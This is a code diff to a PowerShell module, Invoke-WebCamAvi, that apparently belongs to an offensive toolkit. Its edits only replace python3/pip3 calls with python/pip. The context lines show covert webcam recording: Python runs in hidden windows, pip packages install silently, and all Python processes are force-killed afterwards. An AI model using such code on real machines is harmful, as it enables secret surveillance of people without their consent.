@@ -5,7 +5,7 @@
    Author: @r00t-3xp10it
    Credits: @AHLASaad \ @AvinabSaha
    Tested Under: Windows 10 (19044) x64 bits
-   Required Dependencies: python3
+   Required Dependencies: python
    Optional Dependencies: opencv-python
    PS cmdlet Dev version: v1.0.8
 
@@ -87,7 +87,7 @@ $ErrorActionPreference = "SilentlyContinue"
 $host.UI.RawUI.WindowTitle = "@Invoke-WebCamAvi $cmdletver"
 write-host "`n* " -ForegroundColor Green -NoNewline
 write-host "Recording webcam live in avi format." -ForegroundColor Green
-Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](python3 -V) > $WorkingDir\pyver.log" -Wait
+Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](python -V) > $WorkingDir\pyver.log" -Wait
 
 
 #Check if Python3 its installed
@@ -96,12 +96,12 @@ If(-not(Test-Path -Path "$WorkingDir\pyver.log") -or ($pythonTest -iNotMatch 'Tr
 {
    write-host "x " -ForegroundColor Red -NoNewline
    write-host "Error: " -ForegroundColor DarkGray -NoNewline
-   write-host "Module requires python3 installed.`n" -ForegroundColor Red
+   write-host "Module requires python installed.`n" -ForegroundColor Red
    return
 }
 
 #Make sure opencv-python its installed { bypass tests invoking -force 'true' }
-Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](pip3 list|findstr /C:`"opencv-python`") > $WorkingDir\opencv.log" -Wait
+Start-Process -WindowStyle Hidden powershell -ArgumentList "[bool](pip list|findstr /C:`"opencv-python`") > $WorkingDir\opencv.log" -Wait
 If(-not(Test-Path -Path "$WorkingDir\opencv.log") -and ($Force -ieq "false"))
 {
    write-host "x " -ForegroundColor Red -NoNewline
@@ -122,7 +122,7 @@ If($Force -ieq "false")
 
       write-host "  => " -ForegroundColor Yellow -NoNewline
       write-host "Installing:'" -ForegroundColor DarkGray -NoNewline
-      write-host "pip3 install opencv-python" -ForegroundColor Green -NoNewline
+      write-host "pip install opencv-python" -ForegroundColor Green -NoNewline
       write-host "'`n" -ForegroundColor DarkGray
       echo y|pip3 install opencv-python --exists-action ignore #Auto-Install dependencies
       write-host ""
@@ -191,7 +191,8 @@ write-host "  + " -ForegroundColor DarkYellow -NoNewline
 write-host "Starting live capture for '" -NoNewline
 write-host "$RecTime" -ForegroundColor DarkGreen -NoNewline
 write-host "' seconds."
-Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
+Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"
+
 
 ## Config the capture start
 # time counting with 1 sec delay
@@ -199,7 +200,7 @@ Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
 
 Start-Sleep -Seconds $RecTime
 #Stop capture after sellected time
-Stop-Process -Name "python3.*" -Force
+Stop-Process -Name "python*" -Force
 
 
 write-host "  + " -ForegroundColor DarkYellow -NoNewline
@@ -218,10 +219,10 @@ If(-not(Test-Path -Path "${WorkingDir}\${FileName}") -and ($Force -ieq "false"))
    $ParseRawData = Get-Content -Path "$WorkingDir\WebCam.py"|Select-Object -Skip 2
    echo $ParseRawData > "$WorkingDir\WebCam.py";Start-Sleep -Milliseconds 800
 
-   Start-Process -WindowStyle hidden python3 -ArgumentList "WebCam.py"
+   Start-Process -WindowStyle hidden python -ArgumentList "WebCam.py"
    Start-Sleep -Seconds $RecTime
    #Stop capture after sellected time
-   Stop-Process -Name "python3.*" -Force
+   Stop-Process -Name "python*" -Force
 
    Start-Sleep -Milliseconds 1300
    If(-not(Test-Path -Path "${WorkingDir}\${FileName}"))
